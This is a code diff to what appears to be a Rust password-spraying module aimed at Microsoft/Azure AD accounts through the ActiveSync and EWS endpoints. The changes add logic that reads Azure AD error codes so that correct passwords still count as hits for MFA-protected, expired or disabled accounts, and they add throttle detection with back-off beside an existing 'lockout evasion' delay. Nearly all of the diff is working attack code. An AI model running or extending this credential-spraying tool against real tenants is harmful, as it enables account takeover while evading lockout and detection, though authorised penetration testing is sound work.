@@ -148,6 +148,44 @@ fn classify_http_response(status: u16, diag: &Option<String>) -> &'static str {
     }
 }
 
+/// Decide whether a response proves the PASSWORD is correct — even when another
+/// control blocks the sign-in (MFA, expired, disabled). Azure AD returns 401 with
+/// an ESTS error code in `X-MS-Diagnostics`; several of those codes mean the
+/// password was right (MSOLSpray semantics). Keying success only on HTTP 200
+/// missed every valid-but-flagged account. Returns Some(reason) if valid.
+fn credential_is_valid(status: u16, diag: &Option<String>) -> Option<&'static str> {
+    if status == 200 {
+        return Some("valid credentials (full access)");
+    }
+    let d = diag.as_deref()?;
+    if d.contains("50126") {
+        // AADSTS50126: invalid username or password — the one true negative.
+        None
+    } else if d.contains("50055") {
+        Some("valid credentials — password expired")
+    } else if d.contains("50057") {
+        Some("valid credentials — account disabled")
+    } else if d.contains("50079") || d.contains("50076") || d.contains("50074") || d.contains("53004") {
+        Some("valid credentials — MFA required")
+    } else if d.contains("50158") {
+        Some("valid credentials — external security challenge (conditional access)")
+    } else {
+        None
+    }
+}
+
+/// True when Azure AD is throttling us (HTTP 429/503 or an ESTS throttle code),
+/// so the spray can back off instead of hammering through false negatives.
+fn is_throttled(status: u16, diag: &Option<String>) -> bool {
+    if status == 429 || status == 503 {
+        return true;
+    }
+    match diag.as_deref() {
+        Some(d) => d.contains("90033") || d.to_lowercase().contains("throttle"),
+        None => false,
+    }
+}
+
 // ============================================================================
 // SMTP Spray Logic
 // ============================================================================
@@ -475,6 +513,9 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
 
         // Spray this password across all users with concurrency control
         let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));
+        // Set by any worker that sees Azure AD throttling, so we back off before
+        // the next password round instead of hammering through false negatives.
+        let throttled = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
         let mut handles = Vec::new();
 
         for user in &users {
@@ -483,6 +524,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
             }
 
             let sem = semaphore.clone();
+            let throttled = throttled.clone();
             let client = client.clone();
             let user = user.clone();
             let password = password.clone();
@@ -497,23 +539,29 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                 if mode == SprayMode::ActiveSync || mode == SprayMode::All {
                     match try_http_basic(&client, ACTIVESYNC_URL, &user, &password).await {
                         Ok((status, diag)) => {
-                            let detail = classify_http_response(status, &diag);
-                            if status == 200 {
-                                round_hits.push(SprayHit {
-                                    username: user.clone(),
-                                    password: password.clone(),
-                                    endpoint: "ActiveSync".to_string(),
-                                    status,
-                                    detail: detail.to_string(),
-                                });
-                            } else if verbose {
-                                crate::mprintln!(
-                                    "  [{}] {} @ ActiveSync: {} ({})",
-                                    status,
-                                    user,
-                                    detail,
-                                    diag.clone().unwrap_or_default()
-                                );
+                            if is_throttled(status, &diag) {
+                                throttled.store(true, std::sync::atomic::Ordering::Relaxed);
+                            }
+                            match credential_is_valid(status, &diag) {
+                                Some(reason) => {
+                                    round_hits.push(SprayHit {
+                                        username: user.clone(),
+                                        password: password.clone(),
+                                        endpoint: "ActiveSync".to_string(),
+                                        status,
+                                        detail: reason.to_string(),
+                                    });
+                                }
+                                None if verbose => {
+                                    crate::mprintln!(
+                                        "  [{}] {} @ ActiveSync: {} ({})",
+                                        status,
+                                        user,
+                                        classify_http_response(status, &diag),
+                                        diag.clone().unwrap_or_default()
+                                    );
+                                }
+                                None => {}
                             }
                             // Warn on lockout/block
                             if status == 403 || status == 456 {
@@ -522,7 +570,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                                     format!(
                                         "[!] {} - {} ({})",
                                         user,
-                                        detail,
+                                        classify_http_response(status, &diag),
                                         diag.unwrap_or_default()
                                     )
                                     .yellow()
@@ -545,23 +593,29 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                 if mode == SprayMode::Ews || mode == SprayMode::All {
                     match try_http_basic(&client, EWS_URL, &user, &password).await {
                         Ok((status, diag)) => {
-                            let detail = classify_http_response(status, &diag);
-                            if status == 200 {
-                                round_hits.push(SprayHit {
-                                    username: user.clone(),
-                                    password: password.clone(),
-                                    endpoint: "EWS".to_string(),
-                                    status,
-                                    detail: detail.to_string(),
-                                });
-                            } else if verbose {
-                                crate::mprintln!(
-                                    "  [{}] {} @ EWS: {} ({})",
-                                    status,
-                                    user,
-                                    detail,
-                                    diag.clone().unwrap_or_default()
-                                );
+                            if is_throttled(status, &diag) {
+                                throttled.store(true, std::sync::atomic::Ordering::Relaxed);
+                            }
+                            match credential_is_valid(status, &diag) {
+                                Some(reason) => {
+                                    round_hits.push(SprayHit {
+                                        username: user.clone(),
+                                        password: password.clone(),
+                                        endpoint: "EWS".to_string(),
+                                        status,
+                                        detail: reason.to_string(),
+                                    });
+                                }
+                                None if verbose => {
+                                    crate::mprintln!(
+                                        "  [{}] {} @ EWS: {} ({})",
+                                        status,
+                                        user,
+                                        classify_http_response(status, &diag),
+                                        diag.clone().unwrap_or_default()
+                                    );
+                                }
+                                None => {}
                             }
                             if status == 403 || status == 456 {
                                 crate::mprintln!(
@@ -569,7 +623,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                                     format!(
                                         "[!] {} - {} ({})",
                                         user,
-                                        detail,
+                                        classify_http_response(status, &diag),
                                         diag.unwrap_or_default()
                                     )
                                     .yellow()
@@ -656,6 +710,15 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                     hits.push(hit);
                 }
             }
+        }
+
+        // Back off if Azure AD throttled us this round (429/503/ESTS throttle).
+        if throttled.load(std::sync::atomic::Ordering::Relaxed) && round_idx + 1 < total_rounds {
+            crate::mprintln!(
+                "{}",
+                "[!] Throttling detected — backing off 60s before the next password round".yellow()
+            );
+            tokio::time::sleep(Duration::from_secs(60)).await;
         }
 
         // Delay between rounds (lockout evasion)
